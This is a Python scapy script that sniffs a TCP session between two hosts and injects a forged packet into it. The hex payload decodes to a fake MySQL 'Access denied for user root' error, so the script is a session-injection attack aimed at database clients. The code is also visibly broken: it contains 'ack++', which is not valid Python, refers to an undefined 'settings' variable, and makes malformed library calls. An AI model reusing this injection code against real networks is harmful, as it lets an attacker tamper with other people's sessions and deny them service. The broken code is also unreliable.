from scapy.all import *
import time
import threading
from libs import packet as lpacket

class sniff_settings:
    running = True
    src = ""
    dst = ""
    port = ""
    stop = threading.Event()
    injected = False
    data = []

def add_pkt(pkt):
    global sniff_settings
    settings.data.append(pkt)

def export():
    global sniff_settings
    scapy.wrpcap(settings.data)

def print_pkt(pkt):
    pkt.show()
#    pkt.hexraw()

inject_packet = None
current_response = None

class sniffer:
    def sniff(pkt):
        global sniff_settings
        ack = 0
        psh = False
        if pkt[TCP].flags == "A":
            ack++
        if pkt[TCP].flags == "PA" and ack == 2:
            psh = True
        if pkt[TCP].flags == "A" and ack == 3 and psh == True and pkt[IP].src == sniff_settings.dst:
            # send payload (reponse error) to client
            inject_packet = pkt
            inject_packet.flags = "PA"
            inject_packet.load ="48000002ff15042332383030304163636573732064656e69656420666f7220757365722027726f6f742740273137322e31382e302e"+hex(ord(pkt[IP].dst.split(".")[3]))+"2720287573696e672070617373776f72643a204e4f29"
            del inject_packet.len
            del inject_packet.options
            del inject_packet.chksum
            del inject_packet[TCP].chksum
            sendp(inject_packet, Verbose=True)
            inject_packet.show()
            # send request query to server

    def __init__(self):
        global sniff_settings
        sniff(prn=sniffer.sniff, filter=f"tcp port {sniff_settings.port} and (host {sniff_settings.dst} and host {sniff_settings.src})", stop_filter=lambda p: sniff_settings.stop.is_set())
        sniff_settings.running = False

def stop():
    global sniff_settings
    sniff_settings.stop.set()

def start(src, dst, port):
    global sniff_settings

    sniff_settings.src = src
    sniff_settings.dst = dst
    sniff_settings.port = port

    threading.Thread(target=sniffer).start()
    print("sniffer started!")
    while not sniff_settings.injected:
        time.sleep(0.02)
